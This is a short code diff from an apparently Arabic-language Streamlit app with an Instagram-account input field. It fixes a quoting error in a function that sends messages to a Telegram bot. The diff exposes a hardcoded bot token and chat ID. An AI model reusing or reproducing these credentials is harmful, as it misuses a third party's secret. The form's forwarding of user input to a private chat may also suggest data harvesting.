@@ -52,7 +52,7 @@ insta = st.text_input("حساب الانستغرام")
 
 # 5. وظيفة إرسال الرسالة للبوت
 def send_to_telegram(message):
-    token = 8640762406:AAF540rnfipL54HSUIRZqODSsBcQjM2uybo""
+    token = "8640762406:AAF540rnfipL54HSUIRZqODSsBcQjM2uybo"
     chat_id = "7055252264"
     url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
     try:
